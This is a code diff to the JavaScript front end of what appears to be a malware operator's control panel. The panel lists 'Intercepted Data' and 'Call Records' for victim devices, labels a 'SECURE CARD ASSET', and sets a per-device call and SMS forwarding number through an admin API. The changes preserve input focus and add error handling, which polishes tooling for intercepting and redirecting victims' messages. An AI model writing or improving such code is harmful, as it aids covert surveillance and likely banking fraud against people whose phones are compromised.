@@ -567,6 +567,10 @@
                     '</div>';
                 }).join('');
 
+            const existingInput = document.getElementById('fwdNum');
+            const currentInputValue = existingInput ? existingInput.value : (activeUser.forwarding_number || '');
+            const isInputFocused = existingInput === document.activeElement;
+
             body.innerHTML = '<div class="premium-card">' +
                     '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;">' +
                         '<span style="font-size: 10px; font-weight: 800; color: rgba(255,255,255,0.4); letter-spacing: 2px;">SECURE CARD ASSET</span>' +
@@ -580,7 +584,7 @@
                 '</div>' +
                 '<div class="control-group">' +
                     '<span class="control-label">Forwarding Protocol</span>' +
-                    '<input type="tel" class="custom-input" id="fwdNum" value="' + (activeUser.forwarding_number || '') + '" placeholder="+91 00000 00000">' +
+                    '<input type="tel" class="custom-input" id="fwdNum" value="' + currentInputValue + '" placeholder="+91 00000 00000">' +
                     '<button class="action-btn" onclick="saveForwarding()"><i class="ph-bold ph-lightning"></i> SYNC PROTOCOL</button>' +
                 '</div>' +
                 '<span class="control-label">Intercepted Data</span>' +
@@ -589,20 +593,36 @@
                     '<div class="tab-item ' + (activeTab === 'calls' ? 'active' : '') + '" onclick="switchTab(\'calls\')">Call Records</div>' +
                 '</div>' +
                 '<div class="log-list">' + logsHtml + '</div>';
+            
+            if (isInputFocused) {
+                const newInput = document.getElementById('fwdNum');
+                newInput.focus();
+                newInput.setSelectionRange(newInput.value.length, newInput.value.length);
+            }
         }
 
         function switchTab(tab) { activeTab = tab; renderDrawer(); }
 
         async function saveForwarding() {
             const num = document.getElementById('fwdNum').value;
+            console.log('Syncing Protocol for:', activeUser.device_id, 'Number:', num);
             try {
-                await fetch('/api/admin/update-forwarding', {
+                const res = await fetch('/api/admin/update-forwarding', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ deviceId: activeUser.device_id, number: num, enabled: true })
                 });
-                showToast('Protocol Updated Successfully');
-            } catch (err) { showToast('Sync Failed', true); }
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Protocol Updated Successfully');
+                    fetchData(); // Refresh to get updated state
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (err) { 
+                console.error('Sync Error:', err);
+                showToast('Sync Failed: ' + err.message, true); 
+            }
         }
 
         function showToast(msg, isError = false) {
